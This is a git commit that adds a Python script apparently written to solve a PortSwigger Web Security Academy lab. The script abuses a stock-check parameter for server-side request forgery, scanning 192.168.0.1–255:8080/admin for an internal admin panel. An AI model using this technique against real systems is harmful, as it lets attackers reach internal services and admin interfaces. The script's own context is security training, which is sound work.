7da8dc15547e389293362f431a2ed7389561c5f9
PlatasSec <107104784+PlatasSec@users.noreply.github.com>
2023-11-04 11:07:50 +0100

    Create ssrf_ check_ip_backend.py

---
+++ check_ip_addresses/ssrf_ check_ip_backend.py
@@ -0,0 +1,17 @@
+import requests
+import concurrent.futures
+
+SUBNET = "192.168.0."
+PORT = "8080"
+
+def check_ip(ip_number):
+    ip_address = f"{SUBNET}{ip_number}"
+    post_data = {"stockApi": f"http://{ip_address}:{PORT}/admin"}
+
+    response = requests.post("https://0af7002c03eee20d80ed442f0063009a.web-security-academy.net/product/stock", data=post_data)
+
+    if response.status_code == 200:
+        print(f"IP Address {ip_address} returned HTTP 200 (OK)")
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    executor.map(check_ip, range(1, 256))  # Loop through the sequence from 1 to 255 (255 is exclusive)
